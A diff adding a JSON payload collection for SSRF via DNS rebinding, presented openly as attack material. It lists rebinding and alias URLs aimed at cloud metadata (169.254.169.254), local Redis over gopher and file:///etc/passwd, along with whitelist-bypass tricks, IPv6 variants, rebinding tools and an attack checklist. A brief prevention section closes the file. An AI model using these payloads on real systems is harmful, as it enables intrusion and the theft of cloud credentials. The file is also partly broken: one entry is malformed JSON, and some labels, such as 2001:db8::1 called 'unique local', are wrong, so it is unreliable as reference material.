@@ -1,0 +1,115 @@
+{
+  "info": {
+    "name": "SSRF DNS Rebinding Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "DNS rebinding attack vectors for SSRF bypass. 2026 updated with fast flux, DNS pin, and multi-layer rebinding techniques.",
+    "category": "SSRF",
+    "severity": "CRITICAL",
+    "owasp": "A10:2021 - Server-Side Request Forgery"
+  },
+  "attack_principle": {
+    "explanation": "DNS rebinding tricks the server into making requests to internal resources by controlling DNS TTL and mapping an external domain to an internal IP on the first lookup, then changing it to an external IP or vice versa.",
+    "attack_steps": [
+      "1. Attacker controls DNS for domain (attacker.com)",
+      "2. First DNS lookup returns public IP with short TTL",
+      "3. Server makes HTTP request to attacker.com",
+      "4. Before second DNS lookup, attacker changes DNS to point to internal IP (169.254.169.254)",
+      "5. Server's connection is redirected to internal resource"
+    ]
+  },
+  "dns_rebinding_techniques": {
+    "classic_rebinding": [
+      {"url": "http://[RANDOM].rbndr.us/", "description": "Rebind network DNS (http://7f000001.rbndr.us/ = 127.0.0.1)", "type": "dns_rebind"},
+      {"url": "http://[RANDOM]-127.0.0.1.rbndr.us/", "description": "Direct rebind to localhost", "type": "dns_rebind"},
+      "url": "http://target.com.127.0.0.1.attacker.com/", "description": "Multi-level rebind domain", "type": "dns_rebind"}
+    ],
+    "time_windows": [
+      {"url": "http://fast-rebind.attacker.com/", "description": "Fast flux rebind (TTL: 1 second)", "type": "time_window", "note": "Change IP after 1s"},
+      {"url": "http://slow-rebind.attacker.com/", "description": "Slow rebind (TTL: 30 seconds)", "type": "time_window", "note": "Some servers cache longer"},
+      {"url": "http://no-cache.attacker.com/", "description": "No-cache headers in DNS response", "type": "time_window"}
+    ],
+    "protocol_switch": [
+      {"url": "http://[RANDOM].rebinder.com -> https://169.254.169.254/", "description": "HTTP to HTTPS protocol switch", "type": "protocol_switch"},
+      {"url": "http://[RANDOM].rebinder.com -> gopher://127.0.0.1:6379/", "description": "HTTP to Gopher protocol switch", "type": "protocol_switch"},
+      {"url": "http://[RANDOM].rebinder.com -> file:///etc/passwd", "description": "HTTP to File protocol switch", "type": "protocol_switch"}
+    ],
+    "dns_aliasing": [
+      {"url": "http://169.254.169.254.nip.io/", "description": "nip.io alias to metadata IP", "type": "alias", "provider": "generic"},
+      {"url": "http://127.0.0.1.nip.io/", "description": "nip.io localhost alias", "type": "alias", "provider": "generic"},
+      {"url": "http://169.254.169.254.xip.io/", "description": "xip.io alias", "type": "alias", "provider": "generic"},
+      {"url": "http://sslip.io/", "description": "sslip.io DNS", "type": "alias", "provider": "generic"}
+    ],
+    "whitelist_bypass": [
+      {"url": "http://attacker.com.169.254.169.254/", "description": "Domain prefix with IP suffix", "type": "whitelist_bypass"},
+      {"url": "http://169.254.169.254.attacker.com/", "description": "IP prefix with domain suffix", "type": "whitelist_bypass"},
+      {"url": "http://legit.com.attacker.com/", "description": "Legit domain prefix attack", "type": "whitelist_bypass"},
+      {"url": "http://attacker.com&X=169.254.169.254/", "description": "Parameter pollution", "type": "whitelist_bypass"}
+    ],
+    "dns_pinning_bypass": [
+      {"url": "http://[RANDOM].dyndns.org/", "description": "DynDNS with controlled IP changes", "type": "dns_pinning"},
+      {"url": "http://[RANDOM].servehttp.com/", "description": "ServeHTTP rebinding", "type": "dns_pinning"},
+      {"url": "http://[RANDOM].oast.pro/", "description": "Custom DNS server with fast switching", "type": "dns_pinning"}
+    ]
+  },
+  "modern_rebinding_tools": {
+    "singularity": {
+      "description": "DNS rebinding tool with multiple strategies",
+      "url": "https://github.com/nccgroup/singularity",
+      "techniques": ["First-hit, pin-to-src", "Fixed-IP, pin-to-src", "Fixed-IP, first-hit", "Fixed-IP, random"]
+    },
+    "dnsproxy": {
+      "description": "Python DNS rebinding proxy",
+      "url": "https://github.com/SinjaFF/dnsproxy",
+      "techniques": ["Whitelist bypass", "TTL manipulation"]
+    },
+    "rabbithole": {
+      "description": "Automated DNS rebinding framework",
+      "url": "https://github.com/JLospino/rabbithole",
+      "techniques": ["Multi-step rebinding", "Protocol switching"]
+    }
+  },
+  "bypass_scenarios": {
+    "whitelist_protected": [
+      {"technique": "DNS pinning bypass", "method": "Pin to allowed domain, then rebind to internal IP"},
+      {"technique": "IPv6 vs IPv4", "method": "Use IPv6 address that maps to internal resource"},
+      {"technique": "CNAME chain", "method": "Use CNAME record that resolves to internal IP"}
+    ],
+    "hostname_validation": [
+      {"technique": "Case manipulation", "method": "useR.domain.com vs user.DOMAIN.com"},
+      {"technique": "Unicode homograph", "method": " Cyrillic 'а' vs Latin 'a'"},
+      {"technique": "Subdomain injection", "method": "legit.com.attacker.com"}
+    ]
+  },
+  "ipv6_rebinding": [
+    {"url": "http://[::1]/", "description": "IPv6 localhost", "type": "ipv6"},
+    {"url": "http://[::ffff:127.0.0.1]/", "description": "IPv4-mapped IPv6", "type": "ipv6"},
+    {"url": "http://[0:0:0:0:0:ffff:169.254.169.254]/", "description": "IPv4-mapped AWS metadata", "type": "ipv6"},
+    {"url": "http://[2001:db8::1]/", "description": "IPv6 unique local", "type": "ipv6"},
+    {"url": "http://[fe80::1]/", "description": "IPv6 link-local", "type": "ipv6"}
+  ],
+  "detection_and_prevention": {
+    "indicators_of_vulnerability": [
+      "No DNS pinning implemented",
+      "Low TTL values accepted",
+      "Hostname validation only, not IP validation",
+      "No DNS rebinding protection headers"
+    ],
+    "protection_mechanisms": [
+      "DNS pinning (reject DNS changes for connection lifetime)",
+      "Validate both hostname AND IP",
+      "Use HTTPS with certificate pinning",
+      "Block private IP ranges at network level",
+      "Set Host header validation"
+    ]
+  },
+  "testing_checklist": [
+    "Set up DNS rebinding service",
+    "Configure first IP to be public (passes initial checks)",
+    "Configure second IP to be internal (169.254.x.x or 10.x.x.x)",
+    "Use short TTL (< 5 seconds)",
+    "Verify server makes two DNS lookups",
+    "Check if server validates hostname or IP",
+    "Test with different internal targets"
+  ]
+}
